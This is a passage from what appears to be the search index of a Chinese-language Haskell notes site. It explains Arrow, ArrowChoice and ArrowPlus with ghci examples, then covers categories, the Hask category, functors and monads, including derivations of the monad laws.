\u5176\u4e2d\uff1a arr \u51fd\u6570\u5c06\u4e00\u4e2a\u51fd\u6570\u53d8\u6210\u4e00\u4e2a Arrow first \u51fd\u6570\u5c06\u4e00\u4e2a Arrow \u53d8\u6210\u4e00\u4e2a\u4e8c\u5143\u7ec4\u95f4\u7684 Arrow\uff0c\u4e14\u53ea\u4f1a\u5bf9\u4e00\u4e2a\u5143\u7d20\u8fdb\u884c\u64cd\u4f5c\uff0c\u7b2c\u4e8c\u4e2a\u5143\u7d20\u4fdd\u6301\u4e0d\u53d8 second \u51fd\u6570\u4e0e first \u76f8\u53cd\uff0c\u7b2c\u4e00\u4e2a\u5143\u7d20\u4fdd\u6301\u4e0d\u53d8 *** \u51fd\u6570\u662f Arrow \u4e4b\u95f4\u7684 parallel composition\uff0c\u5bf9\u4e8e\u51fd\u6570: (g *** h) (x, y) = (g x, h y) &&& \u51fd\u6570\u662f Arrow \u4e4b\u95f4\u7684 fanout composition\uff0c\u5bf9\u4e8e\u51fd\u6570: (g &&& h) x = (g x, h x) \u5b83\u7684\u5b9e\u4f8b\u4e5f\u6709 (->) \u548c Kleisli\uff1a instance Arrow ( -> ) where arr :: ( b -> c ) -> ( b -> c ) arr g = g first :: ( b -> c ) -> (( b , d ) -> ( c , d )) first g ( x , y ) = ( g x , y ) instance Monad m => Arrow ( Kleisli m ) where arr :: ( b -> c ) -> Kleisli m b c arr f = Kleisli ( return . f ) first :: Kleisli m b c -> Kleisli m ( b , d ) ( c , d ) first ( Kleisli f ) = Kleisli ( \\ ~ ( b , d ) -> do c <- f b return ( c , d ) ) \u5e38\u7528\u51fd\u6570\uff1a returnA :: Arrow a => a b b returnA = arr id ( ^>> ) :: Arrow a => ( b -> c ) -> a c d -> a b d f ^>> a = arr f >>> a ( >>^ ) :: Arrow a => a b c -> ( c -> d ) -> a b d a >>^ f = a >>> arr f ( <<^ ) :: Arrow a => a c d -> ( b -> c ) -> a b d a <<^ f = a <<< arr f ( ^<< ) :: Arrow a => ( c -> d ) -> a b c -> a b d f ^<< a = arr f <<< a","title":"Arrow"},{"location":"cs/pl/haskell/#arrow-notation","text":"\u7c7b\u4f3c do-notation\uff0cArrow \u4e5f\u63d0\u4f9b\u4e86\u4e00\u5957\u65b9\u4fbf\u7684\u8bed\u53e5\uff1a proc x -> do y <- action1 -< ... z <- action2 -< ... returnA -< ... \u5176\u4e2d proc \u4ee3\u66ff\u4e86 lambda \u8868\u8fbe\u5f0f\u4e2d\u7684\u659c\u6760 \\\uff0c-< \u53f3\u8fb9\u7684\u4e3a\u8f93\u5165\uff0c\u5de6\u8fb9\u7684\u4e3a\u63a5\u6536\u8f93\u5165\u7684\u51fd\u6570\u3002\u6bd4\u5982\uff0c\u4e0b\u9762\u4e09\u79cd\u5199\u6cd5\u8fbe\u6210\u7684\u6548\u679c\u662f\u4e00\u6837\u7684\uff1a f :: Int -> ( Int , Int ) f = \\ x -> let y = 2 * x z1 = y + 3 z2 = y - 5 in ( z1 , z2 ) -- ghci> f 10 -- (23,15) fM :: Int -> Identity ( Int , Int ) fM = \\ x -> do y <- return ( 2 * x ) z1 <- return ( y + 3 ) z2 <- return ( y - 5 ) return ( z1 , z2 ) -- ghci> runIdentity (fM 10) -- (23,15) fA :: Int -> ( Int , Int ) fA = proc x -> do y <- ( 2 * ) -< x z1 <- ( + 3 ) -< y z2 <- ( subtract 5 ) -< y returnA -< ( z1 , z2 ) -- ghci> fA 10 -- (23,15)","title":"Arrow notation"},{"location":"cs/pl/haskell/#arrowchoice","text":"class Arrow a => ArrowChoice a where left :: a b c -> a ( Either b d ) ( Either c d ) left = ( +++ id ) right :: a b c -> a ( Either d b ) ( Either d c ) right = ( id +++ ) ( +++ ) :: a b c -> a b' c' -> a ( Either b b' ) ( Either c c' ) f +++ g = left f >>> arr mirror >>> left g >>> arr mirror where mirror :: Either x y -> Either y x mirror ( Left x ) = Right x mirror ( Right y ) = Left y ( ||| ) :: a b d -> a c d -> a ( Either b c ) d f ||| g = f +++ g >>> arr untag where untag ( Left x ) = x untag ( Right y ) = y instance ArrowChoice ( -> ) where left f = f +++ id right f = id +++ f f +++ g = ( Left . f ) ||| ( Right . g ) ( ||| ) = either instance Monad m => ArrowChoice ( Kleisli m ) where left f = f +++ arr id right f = arr id +++ f f +++ g = ( f >>> arr Left ) ||| ( g >>> arr Right ) Kleisli f ||| Kleisli g = Kleisli ( either f g )","title":"ArrowChoice"},{"location":"cs/pl/haskell/#arrowzero-arrowplus","text":"class Arrow a => ArrowZero a where zeroArrow :: a b c class ArrowZero a => ArrowPlus a where ( <+> ) :: a b c -> a b c -> a b c instance MonadPlus m => ArrowZero ( Kleisli m ) where zeroArrow = Kleisli ( \\ _ -> mzero ) instance MonadPlus m => ArrowPlus ( Kleisli m ) where Kleisli f <+> Kleisli g = Kleisli ( \\ x -> f x ` mplus ` g x )","title":"ArrowZero &amp; ArrowPlus"},{"location":"cs/pl/haskell/#_26","text":"ghci > runKleisli (( Kleisli ( \\ x -> [ x * 2 ])) <+> ( Kleisli ( \\ x -> [ x , - x ]))) 2 [ 4 , 2 , - 2 ] ghci > either ( + 2 ) ( * 3 ) ( Left 3 ) 5 ghci > either ( + 2 ) ( * 3 ) ( Right 3 ) 9 ghci > ( + 2 ) ||| ( * 3 ) $ ( Left 3 ) 5 ghci > ( + 2 ) +++ ( * 3 ) $ ( Left 3 ) Left 5 ghci > ( + 2 ) ||| ( * 3 ) $ ( Right 3 ) 9 ghci > ( + 2 ) +++ ( * 3 ) $ ( Right 3 ) Right 9 ghci > left ( + 2 ) ( Left 3 ) Left 5 ghci > right ( * 3 ) ( Right 3 ) Right 9 ghci > left ( + 2 ) ( Right 3 ) Right 3 ghci > right ( * 3 ) ( Left 3 ) Left 3 ghci > runKleisli (( Kleisli ( \\ x -> [ x * 2 ])) ||| ( Kleisli ( \\ x -> [ x , - x ]))) ( Left 3 ) [ 6 ] ghci > runKleisli (( Kleisli ( \\ x -> [ x * 2 ])) ||| ( Kleisli ( \\ x -> [ x , - x ]))) ( Right 3 ) [ 3 , - 3 ] ghci > runKleisli (( Kleisli ( \\ x -> [ x * 2 ])) +++ ( Kleisli ( \\ x -> [ x , - x ]))) ( Left 3 ) [ Left 6 ] ghci > runKleisli (( Kleisli ( \\ x -> [ x * 2 ])) +++ ( Kleisli ( \\ x -> [ x , - x ]))) ( Right 3 ) [ Right 3 , Right ( - 3 )]","title":"\u4f8b\u5b50"},{"location":"cs/pl/haskell/#haskell_1","text":"Haskell \u4e2d\u7684\u51fd\u5b50\u5355\u5b50\u7b49\u90fd\u4e0e\u8303\u7574\u8bba\uff08category theory\uff09\u6709\u5f88\u591a\u8054\u7cfb\uff0c\u6240\u4ee5\u6253\u7b97\u7b80\u5355\u4e86\u89e3\u4e00\u4e0b\u8303\u7574\u8bba\u7684\u76f8\u5173\u5185\u5bb9\u3002 \u8303\u7574\u8bba \u662f\u6570\u5b66\u7684\u4e00\u95e8\u5b66\u79d1\uff0c\u4ee5\u62bd\u8c61\u7684\u65b9\u6cd5\u5904\u7406\u6570\u5b66\u6982\u5ff5\uff0c\u5c06\u8fd9\u4e9b\u6982\u5ff5\u5f62\u5f0f\u5316\u6210\u4e00\u7ec4\u7ec4\u7684\u201c\u7269\u4ef6\u201d\u53ca\u201c\u6001\u5c04\u201d\u3002\u6570\u5b66\u4e2d\u8bb8\u591a\u91cd\u8981\u7684\u9886\u57df\u53ef\u4ee5\u5f62\u5f0f\u5316\u4e3a\u8303\u7574\u3002\u4f7f\u7528\u8303\u7574\u8bba\u53ef\u4ee5\u4ee4\u8fd9\u4e9b\u9886\u57df\u4e2d\u8bb8\u591a\u96be\u7406\u89e3\u3001\u96be\u6349\u6478\u7684\u6570\u5b66\u7ed3\u8bba\u66f4\u5bb9\u6613\u53d9\u8ff0\u8bc1\u660e\u3002 \u2014\u2014\u2014\u2014 \u7ef4\u57fa\u767e\u79d1","title":"Haskell \u4e0e\u8303\u7574\u8bba"},{"location":"cs/pl/haskell/#category_1","text":"\u8303\u7574\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u96c6\u5408\uff0c\u4e00\u4e2a\u8303\u7574 \\(\\mathbf{C}\\) \u5305\u542b\u4e09\u4e2a\u7ec4\u6210\u6210\u5206\uff1a \u4e00\u4e2a\u7c7b \\(\\mathrm{ob}(\\mathbf{C})\\) \uff1a\u5176\u4e2d\u5143\u7d20\u79f0\u4e3a \u5bf9\u8c61\uff08objects\uff09 \u4e00\u4e2a\u7c7b \\(\\mathrm{hom}(\\mathbf{C})\\) \uff1a\u5176\u4e2d\u5143\u7d20\u79f0\u4e3a \u6001\u5c04\uff08morphisms\uff09 \uff08\u6216 \u7bad\u53f7\uff08arrows\uff09 \uff09\uff1a\u6bcf\u4e2a\u6001\u5c04\u8fde\u63a5\u4e86\u4e24\u4e2a\u5bf9\u8c61\uff1a\u6e90\u5bf9\u8c61\uff08source object\uff09\u3001\u76ee\u6807\u5bf9\u8c61\uff08target object\uff09\u3002\u5982\u679c \\(f\\) \u662f\u4ece\u6e90\u5bf9\u8c61 \\(A\\) \u5230\u76ee\u6807\u5bf9\u8c61 \\(B\\) \uff08 \\(A, B\\in \\mathrm{ob}(\\mathbf{C})\\) \uff09\u7684\u6001\u5c04\uff0c\u90a3\u4e48\u8bb0\u4e3a \\(f : A\\to B\\) \u4e00\u4e2a\u4e8c\u5143\u8fd0\u7b97\uff0c\u79f0\u4e3a\u6001\u5c04 \u590d\u5408\uff08composition\uff09 \uff1a\u4e24\u4e2a\u6001\u5c04 \\(g : A\\to B\\) \u3001 \\(f : B\\to C\\) \u7684\u590d\u5408\u8bb0\u4e3a \\(f\\circ g : A\\to C\\) \u5728 Haskell \u548c\u5927\u90e8\u5206\u6570\u5b66\u7406\u8bba\u4e2d\u90fd\u662f\u4ece\u53f3\u5411\u5de6\u8ba1\u7b97\uff0c\u5373 \\(f\\circ g\\) \u4e2d\u662f\u5148\u8ba1\u7b97 \\(g : A\\to B\\) \u518d\u8ba1\u7b97 \\(f : B\\to C\\) \u8bb8\u591a\u4e1c\u897f\u90fd\u53ef\u4ee5\u7ec4\u6210\u8303\u7574\u3002\u6bd4\u5982: \u4f8b \u2003 \\(\\mathbf{Set}\\) \u662f\u4e00\u4e2a\u8303\u7574\uff0c\u5bf9\u8c61\u4e3a\u6240\u6709\u96c6\u5408\uff0c\u6001\u5c04\u4e3a\u96c6\u5408\u4e4b\u95f4\u7684\u51fd\u6570\uff0c\u590d\u5408\u5373\u51fd\u6570\u4e4b\u95f4\u7684\u590d\u5408 \u2003 \\(\\mathbf{Grp}\\) \u662f\u4e00\u4e2a\u8303\u7574\uff0c\u5bf9\u8c61\u4e3a\u6240\u6709\u7fa4\uff0c\u6001\u5c04\u4e3a\u7fa4\u540c\u6001\uff08group homomorphisms\uff09\uff0c\u4f8b\u5982\u5bf9\u4e8e\u7fa4 \\((G,*)\\) \u548c \\((H,\\cdot )\\) \uff0c\u6709\u7fa4\u540c\u6001 \\(h : (G,*)\\to (H,\\cdot )\\) \uff0c\u5219\u9700\u8981\u5bf9\u4e8e \\(G\\) \u4e2d\u7684\u4efb\u610f\u5143\u7d20 \\(u,v\\) \u6ee1\u8db3 \\[h(u*v)=h(u)\\cdot h(v)\\] \u6ce8\u610f \u6001\u5c04\u4e0d\u5fc5\u987b\u4e3a\u51fd\u6570\uff1b\u800c\u4e14\u53ef\u4ee5\u5b58\u5728\u6e90\u5bf9\u8c61\u548c\u76ee\u6807\u5bf9\u8c61\u90fd\u76f8\u540c\u7684\u4e0d\u540c\u6001\u5c04","title":"\u8303\u7574\uff08Category\uff09"},{"location":"cs/pl/haskell/#_27","text":"\u6bcf\u4e2a\u8303\u7574\u90fd\u9700\u8981\u6ee1\u8db3\u4e09\u6761\u5b9a\u5f8b\uff1a \u6001\u5c04\u590d\u5408\u9700\u8981\u6ee1\u8db3 \u7ed3\u5408\u5f8b\uff08associativity\uff09 \uff1a \\(f\\circ (g\\circ h) = (f\\circ g)\\circ h\\) \u8303\u7574\u5728\u590d\u5408\u64cd\u4f5c\u4e0b\u662f \u95ed\u5408\u7684\uff08closed\uff09 \uff1a \u2003\u2003\u2003\u5982\u679c\u8303\u7574 \\(\\mathbf{C}\\) \u4e2d\u5b58\u5728\u6001\u5c04 \\(f : B\\to C\\) \u3001 \\(g : A\\to B\\) \uff0c\u90a3\u4e48\u8303\u7574 \\(\\mathbf{C}\\) \u4e2d\u4e5f\u4e00\u5b9a\u5b58\u5728\u6001\u5c04 \\(h : A\\to C\\) \uff0c\u4e14 \\(h=f\\circ g\\) \u6bcf\u4e2a\u5bf9\u8c61\u90fd\u9700\u8981\u6709 \u5355\u4f4d\u6001\u5c04\uff08identity morphisms\uff09 \uff1a \u2003\u2003\u2003\u5bf9\u4e8e\u8303\u7574 \\(\\mathbf{C}\\) \u4e2d\u7684\u5bf9\u8c61 \\(A\\) \uff0c\u4e00\u5b9a\u5b58\u5728\u5355\u4f4d\u6001\u5c04 \\(\\mathrm{id}_A : A\\to A\\) \uff0c\u4e14\u5bf9\u4e8e\u6bcf\u4e2a\u6001\u5c04 \\(g : A\\to B\\) \uff0c\u4e00\u5b9a\u6709\uff1a \\(g\\circ\\mathrm{id}_A = \\mathrm{id}_B\\circ g = g\\)","title":"\u8303\u7574\u516c\u7406"},{"location":"cs/pl/haskell/#mathbfhask","text":"\u8303\u7574 \\(\\mathbf{Hask}\\) \u7684\u5bf9\u8c61\u4e3a Haskell \u4e2d\u7684\u7c7b\u578b\uff08types\uff09\uff0c\u6001\u5c04\u662f Haskell \u4e2d\u7684\u51fd\u6570\uff0c\u590d\u5408\u8fd0\u7b97\u662f (.) \u3002\u5373\u4ece\u7c7b\u578b A \u5230\u7c7b\u578b B \u7684\u51fd\u6570 f :: A -> B \u5c31\u662f \\(\\mathbf{Hask}\\) \u8303\u7574\u4e2d\u7684\u4e00\u4e2a\u6001\u5c04\u3002\u800c\u51fd\u6570 f :: B -> C \u3001g :: A -> B \u7684\u7ec4\u5408 f . g \u5c31\u662f\u4e00\u4e2a\u65b0\u7684\u51fd\u6570 h :: A -> C\u3002 \u5bf9\u4e8e\u4e09\u6761\u5b9a\u5f8b\uff1a \u7b2c\u4e00\u6761\u663e\u7136\u6ee1\u8db3\uff1af . (g . h) = (f . g) . h \u7b2c\u4e8c\u6761\u4e5f\u663e\u7136\u6ee1\u8db3\uff0c\u5982\u679c\u6709\u51fd\u6570 f :: B -> C \u3001g :: A -> B\uff0c\u4e00\u5b9a\u6709\u51fd\u6570 h = (f . g) :: A -> C \u5bf9\u4e8e\u7b2c\u4e09\u6761\u5b9a\u5f8b\uff0cHaskell \u4e2d\u5b58\u5728\u5355\u4f4d\u51fd\u6570 id \uff0c\u4f46 id \u662f\u591a\u6001\uff08polymorphic\uff09\u7684\uff0c\u8981\u4e3a\u5176\u6307\u5b9a\u7c7b\u578b\u4f7f\u5176\u53d8\u6210\u5355\u6001\uff08monomorphic\uff09\u7684\u3002\u6bd4\u5982\u6001\u5c04 \\(\\mathrm{id}_A\\) \u5728 Haskell \u4e2d\u5c31\u53ef\u4ee5\u8868\u793a\u4e3a id :: A -> A\u3002\u5e76\u4e14\u663e\u7136\u6ee1\u8db3\u7b2c\u4e09\u6761\u5b9a\u5f8b\uff08\u5176\u4e2d f :: A -> B\uff09\uff1a (id :: B -> B) . f = f . (id :: A -> A) = f","title":"\\(\\mathbf{Hask}\\) \u8303\u7574"},{"location":"cs/pl/haskell/#functors_1","text":"\u4e00\u4e2a\u8303\u7574\u4e2d\u7684\u6001\u5c04\u5c06\u4e24\u4e2a\u5bf9\u8c61\u8054\u7cfb\u8d77\u6765\uff0c\u800c\u51fd\u5b50\u5219\u4f1a\u5c06\u4e24\u4e2a\u8303\u7574\u8054\u7cfb\u8d77\u6765\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u51fd\u5b50\u5c31\u662f\u4ece\u4e00\u4e2a\u8303\u7574\u5230\u53e6\u4e00\u4e2a\u8303\u7574\u7684\u53d8\u6362\u3002\u6bd4\u5982\u5bf9\u4e8e\u8303\u7574 \\(\\mathbf{C}\\) \u3001 \\(\\mathbf{D}\\) \uff0c\u5b9a\u4e49\u51fd\u5b50 \\(F : \\mathbf{C}\\to\\mathbf{D}\\) \u6ee1\u8db3\uff1a \u5bf9\u4e8e \\(\\mathbf{C}\\) \u4e2d\u7684\u4efb\u610f\u5bf9\u8c61 \\(A\\) \uff0c\u5728 \\(\\mathbf{D}\\) \u4e2d\u90fd\u6709\u5bf9\u8c61 \\(F(A)\\) \u5bf9\u4e8e \\(\\mathbf{C}\\) \u4e2d\u7684\u4efb\u610f\u6001\u5c04 \\(f : A\\to B\\) \uff0c\u5728 \\(\\mathbf{D}\\) \u4e2d\u90fd\u6709\u6001\u5c04 \\(F(f) : F(A)\\to F(B)\\) \u4f8b \u9057\u5fd8\u51fd\u5b50\uff08forgetful functor\uff09 \\(U : \\mathbf{Grp}\\to\\mathbf{Set}\\) \uff0c\u5c06\u4e00\u4e2a\u7fa4\u6620\u5c04\u5230\u4e00\u4e2a\u96c6\u5408\u4e2d\uff0c\u5c06\u7fa4\u540c\u6001\u6620\u5c04\u5230\u96c6\u5408\u95f4\u7684\u51fd\u6570 \u5e42\u96c6\u51fd\u5b50\uff08power set functor\uff09 \\(P : \\mathbf{Set}\\to\\mathbf{Set}\\) \uff0c\u5c06\u4e00\u4e2a\u96c6\u5408\u6620\u5c04\u5230\u5b83\u7684\u5e42\u96c6\uff0c\u5c06\u539f\u96c6\u5408\u4e2d\u7684\u51fd\u6570 \\(f : A\\to B\\) \u6620\u5c04\u5230\u51fd\u6570 \\(P(f) : \\mathcal{P}(A)\\to\\mathcal{P}(B)\\) \uff0c\u5373\u4ece \\(U\\subseteq A\\) \u5230\u503c\u57df \\(f(U)\\subseteq B\\) \u7684\u6620\u5c04 \u81ea\u51fd\u5b50\uff08endofunctor\uff09 \\(1_{\\mathbf{C}} : \\mathbf{C}\\to\\mathbf{C}\\) \uff0c\u5c06\u4e00\u4e2a\u8303\u7574\u6620\u5c04\u5230\u5b83\u672c\u8eab","title":"\u51fd\u5b50\uff08Functors\uff09"},{"location":"cs/pl/haskell/#_28","text":"\u51fd\u5b50 \\(F : \\mathbf{C}\\to\\mathbf{D}\\) \u4e5f\u9700\u8981\u6ee1\u8db3\u4e24\u4e2a\u516c\u7406\uff1a \u5bf9\u4e8e\u4efb\u610f\u5bf9\u8c61 \\(X\\in\\mathbf{C}\\) \uff0c\u6052\u6709 \\(F(\\mathrm{id}_X)=\\mathrm{id}_{F(X)}\\) \u5bf9\u4e8e\u6001\u5c04 \\(f : Y\\to Z\\) \u3001 \\(g : X\\to Y\\) \uff0c\u6052\u6709 \\(F(f\\circ g) = F(f)\\circ F(g)\\)","title":"\u51fd\u5b50\u516c\u7406"},{"location":"cs/pl/haskell/#mathbfhask_1","text":"Haskell \u4e2d\u7684 Functor \u5b9a\u4e49\u662f\uff1a class Functor ( f :: * -> * ) where fmap :: ( a -> b ) -> f a -> f b \u5bf9\u4e8e Haskell \u4e2d\u7684 Functor\uff0c\u5b83\u5b9e\u9645\u4e0a\u662f\u4ece \\(\\mathbf{Hask}\\) \u8303\u7574\uff08types\uff09\u5230\u5b83\u5b50\u8303\u7574\u7684\u53d8\u6362\u3002\u6bd4\u5982\u5217\u8868\u51fd\u5b50 \\(\\texttt{[]} : \\mathbf{Hask}\\to\\mathbf{Lst}\\) \uff08\u5176\u4e2d \\(\\mathbf{Lst}\\) \u662f\u6240\u6709 Haskell \u4e2d\u5217\u8868\u7c7b\u578b\u6784\u6210\u7684\u8303\u7574\uff09 \u5b83\u4e5f\u8fbe\u6210\u4e86\u8303\u7574\u8bba\u4e2d\u5bf9\u4e8e\u51fd\u5b50\u7684\u8981\u6c42\u3002\u51fd\u5b50\u9700\u8981\u8fdb\u884c\u4e24\u4e2a\u64cd\u4f5c\uff1a\u5c06\u4e00\u4e2a\u8303\u7574\u4e2d\u7684\u5bf9\u8c61\u6620\u5c04\u5230\u53e6\u4e00\u4e2a\u8303\u7574\u4e2d\u3001\u5c06\u4e00\u4e2a\u8303\u7574\u4e2d\u7684\u6001\u5c04\u6620\u5c04\u5230\u53e6\u4e00\u4e2a\u8303\u7574\u4e2d\u3002\u4ee5 Maybe \u4e3a\u4f8b\uff0c\u5b83\u5b9e\u73b0\u4e86\u51fd\u5b50\u7684\u8981\u6c42\uff1a Maybe \u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u4ed6\u53ef\u4ee5\u5c06\u4efb\u610f\u7c7b\u578b T \u53d8\u6210\u65b0\u7c7b\u578b Maybe T\uff0c\u76f8\u5f53\u4e8e\u4ece \\(\\mathbf{Hask}\\) \u8303\u7574\u7684\u5bf9\u8c61\u53d8\u6210\u4e86 \\(\\mathbf{Maybe}\\) \u8303\u7574\u7684\u5bf9\u8c61 fmap \u51fd\u6570\u63a5\u6536\u4e00\u4e2a a -> b \u7c7b\u578b\u7684\u51fd\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a Maybe a -> Maybe b \u7c7b\u578b\u7684\u51fd\u6570\uff0c\u76f8\u5f53\u4e8e\u5c06 \\(\\mathbf{Hask}\\) \u8303\u7574\u4e2d\u7684\u6001\u5c04 \\(f : A\\to B\\) \u6620\u5c04\u6210\u4e86 \\(\\mathbf{Maybe}\\) \u8303\u7574\u4e2d\u7684\u6001\u5c04 \\(\\mathbf{Maybe}(f) : \\mathbf{Maybe}(A)\\to\\mathbf{Maybe}(B)\\) \u6ce8\u610f \u65f6\u523b\u8bb0\u4f4f\u8fd9\u91cc\u7814\u7a76\u7684\u662f \\(\\mathbf{Hask}\\) \u8303\u7574\u548c\u5b83\u7684\u5b50\u8303\u7574\uff0c\u5bf9\u8c61\u662f\u7c7b\u578b\u800c\u4e0d\u662f\u503c\uff0c\u6001\u5c04\u662f\u51fd\u6570\u4e5f\u6307\u7684\u662f\u4ece\u7c7b\u578b\u5230\u7c7b\u578b \u540c\u65f6\uff0cHaskell \u4e2d\u7684 Functor \u4e5f\u6ee1\u8db3\u51fd\u5b50\u516c\u7406\uff1a fmap id = id \u5373 fmap (id :: A -> A) = (id :: f A -> f A) fmap (f . g) = fmap f . fmap g","title":"\\(\\mathbf{Hask}\\) \u8303\u7574\u4e0a\u7684\u51fd\u5b50"},{"location":"cs/pl/haskell/#monads","text":"\u4e00\u4e2a\u5355\u5b50\u8bf4\u767d\u4e86\u4e0d\u8fc7\u5c31\u662f\u81ea\u51fd\u5b50\u8303\u7574\u4e0a\u7684\u4e00\u4e2a\u5e7a\u534a\u7fa4\u800c\u5df2 _(:\u0437\u300d\u2220)_ \u81ea\u51fd\u5b50\u5728\u524d\u9762\u8bf4\u5230\u8fc7\u662f\u4ece\u4e00\u4e2a\u8303\u7574\u5230\u81ea\u8eab\u7684\u4e00\u4e2a\u51fd\u5b50\uff0c\u5982\u8303\u7574 \\(\\mathbf{C}\\) \u4e0a\u7684\u81ea\u51fd\u5b50\u662f \\(F : \\mathbf{C}\\to\\mathbf{C}\\) \u3002\u81ea\u51fd\u5b50\u8303\u7574\u5c31\u662f\u5bf9\u8c61\u90fd\u662f\u81ea\u51fd\u5b50\u7684\u8303\u7574\u3002\u5e7a\u534a\u7fa4\u548c Haskell \u4e2d\u5b66\u5230\u7684 Monoid \u7c7b\u578b\u7c7b\u4e00\u6837\uff0c\u662f\u4e00\u4e2a\u6709\u53ef\u7ed3\u5408\u4e8c\u5143\u8fd0\u7b97\u548c\u5355\u4f4d\u5143\u7684\u4ee3\u6570\u7ed3\u6784\u3002\u56e0\u6b64\u5355\u5b50\u5c31\u662f\u4e00\u4e2a\u81ea\u51fd\u5b50\uff0c\u800c\u4e14\u5b83\u6709\u53ef\u7ed3\u5408\u4e8c\u5143\u8fd0\u7b97\uff08Haskell \u4e2d >=> \uff09\u548c\u5355\u4f4d\u5143\uff08Haskell \u4e2d return \uff09\u3002 \u4e00\u4e2a\u5355\u5b50 \\(M : \\mathbf{C}\\to\\mathbf{C}\\) \u8fd8\u5305\u542b\u4e24\u4e2a\u6001\u5c04\uff08\u5bf9\u4e8e\u8303\u7574 \\(\\mathbf{C}\\) \u4e2d\u7684\u6240\u6709\u5bf9\u8c61 \\(X\\) \uff09\uff1a \\(\\mathrm{unit}_X^M : X\\to M(X)\\) \\(\\mathrm{join}_X^M : M(M(X))\\to M(X)\\) \uff08\u5f53\u5f0f\u5b50\u4e2d\u7684\u5355\u5b50\u660e\u663e\u662f \\(M\\) \u65f6\uff0c\u53ef\u4ee5\u7701\u7565\u4e0a\u6807 \\({}^M\\) \uff09 Haskell \u4e2d Monad \u7684\u5b9a\u4e49\u662f\uff1a class Functor m => Monad m where return :: a -> m a ( >>= ) :: m a -> ( a -> m b ) -> m b \u5176\u4e2d\u5f88\u663e\u7136\u591a\u6001\u51fd\u6570 return \u5bf9\u5e94\u4e86\u5b9a\u4e49\u4e2d\u7684 \\(\\mathrm{unit}\\) \uff0c\u4f46\u662f >>= \u548c \\(\\mathrm{join}\\) \u7684\u5bf9\u5e94\u5173\u7cfb\u5e76\u4e0d\u660e\u663e\u3002\u56e0\u6b64 Haskell \u4e2d\u6709\u4e00\u4e2a\u5de5\u5177\u51fd\u6570 join \uff0c\u5b83\u7684\u6548\u679c\u5c31\u662f\u5b9a\u4e49\u4e2d\u7684 \\(\\mathrm{join}\\) \uff0c\u800c\u4e14\u5b83\u53ef\u4ee5\u548c >>= \u4e92\u76f8\u5b9a\u4e49\uff1a join :: Monad m => m ( m a ) -> m a join x = x >>= id ( >>= ) :: m a -> ( a -> m b ) -> m b x >>= f = join $ fmap f x \u6240\u4ee5 Haskell \u4e2d\u4e3a Monad \u8981\u6c42\u5b9a\u4e49 >>= \u5c31\u76f8\u5f53\u4e8e\u5b9a\u4e49\u4e86 \\(\\mathrm{join}\\) \u4f8b\u5982\uff0c\u5e42\u96c6\u51fd\u5b50 \\(P : \\mathbf{Set}\\to\\mathbf{Set}\\) \u4e5f\u662f\u4e00\u4e2a\u5355\u5b50\uff0c\u53ef\u4ee5\u4e3a\u5b83\u5b9a\u4e49 \\(\\mathrm{unit}\\) \u548c \\(\\mathrm{join}\\) \u4e24\u4e2a\u6001\u5c04\u3002Haskell \u4e2d\u7684\u5217\u8868\u4e5f\u53ef\u4ee5\u8fd1\u4f3c\u770b\u4f5c\u5e42\u96c6\u51fd\u5b50\u3002 \u6001\u5c04/\u51fd\u6570\u7684\u7c7b\u578b \u5e42\u96c6\u51fd\u5b50 Haskell \u4e2d\u5217\u8868 \u4e00\u4e2a\u96c6\u5408 \\(S\\) \u548c\u4e00\u4e2a\u6001\u5c04 \\(f : A\\to B\\) \u4e00\u4e2a\u7c7b\u578b T \u548c\u4e00\u4e2a\u51fd\u6570 f :: A -> B \\(P(f) : \\mathcal{P}(A)\\to\\mathcal{P}(B)\\) fmap f :: [A] -> [B] \\(\\mathrm{unit}_S : S\\to\\mathcal{P}(S)\\) return :: T -> [T] \\(\\mathrm{join}_S : \\mathcal{P}(\\mathcal{P}(S))\\to\\mathcal{P}(S)\\) join :: [[T]] -> [T] \u6001\u5c04/\u51fd\u6570\u7684\u5b9a\u4e49 \u5e42\u96c6\u51fd\u5b50 Haskell \u4e2d\u5217\u8868 \\((\\mathcal{P}(f))(S) = \\\\{f(a):a\\in S\\\\}\\) fmap f xs = [ f a | a <- xs ] \\(\\mathrm{unit}_S(x) = \\\\{x\\\\}\\) return x = [x] \\(\\mathrm{join}_S(L) = \\bigcup L\\) join xs = concat xs","title":"\u5355\u5b50\uff08Monads\uff09"},{"location":"cs/pl/haskell/#_29","text":"\u7ed9\u5b9a\u4e00\u4e2a\u5355\u5b50 \\(M : \\mathbf{C}\\to\\mathbf{C}\\) \uff0c\u548c\u4e00\u4e2a\u6001\u5c04 \\(f : A\\to B\\) \uff08\u5176\u4e2d \\(A,B\\in \\mathbf{C}\\) \uff09\uff0c\u90a3\u4e48\u6ee1\u8db3\u4e0b\u9762\u56db\u6761\u5b9a\u5f8b\uff1a \\(\\mathrm{join}\\circ M(\\mathrm{join})=\\mathrm{join}\\circ\\mathrm{join}\\) \\(\\mathrm{join}\\circ M(\\mathrm{unit})=\\mathrm{join}\\circ\\mathrm{unit}=\\mathrm{id}\\) \\(\\mathrm{unit}\\circ f = M(f)\\circ\\mathrm{unit}\\) \\(\\mathrm{join}\\circ M(M(f)) = M(f)\\circ\\mathrm{join}\\) \u4e5f\u53ef\u4ee5\u5f88\u81ea\u7136\u5730\u5c06\u5176\u8f6c\u5316\u4e3a Haskell \u4e2d\u7684\u8868\u8ff0\uff1a join . fmap join = join . join join . fmap return = join . return = id return . f = fmap f . return join . fmap (fmap f) = fmap f . join \u5728 Haskell \u4e2d\uff0c\u4f7f\u7528 >>= \u4e5f\u6709\u4e09\u4e2a\u5b9a\u5f8b\u548c\u8fd9\u56db\u4e2a\u5b9a\u5f8b\u662f\u7b49\u4ef7\u7684\uff1a return x >>= f = f x return x >>= f = join ( fmap f ( return x )) = join ( fmap f . return $ x ) = join ( return ( f x )) = join ( return . f $ x ) = join . return $ ( f x ) = id ( f x ) = f x m >>= return = m m >>= return = join ( fmap return m ) = join . fmap return $ m = id m = m (m >>= f) >>= g = m >>= (\\x -> f x >>= g) ( m >>= f ) >>= g = ( join ( fmap f m )) >>= g = join ( fmap g ( join ( fmap f m ))) = join . fmap g . join $ fmap f m = join . join . fmap ( fmap g ) $ fmap f m = join . join . fmap ( fmap g ) . fmap f $ m = join . join . fmap ( fmap g . f ) $ m = join . fmap join . fmap ( fmap g . f ) $ m = join . fmap ( join . ( fmap g . f )) $ m = join . fmap ( \\ x 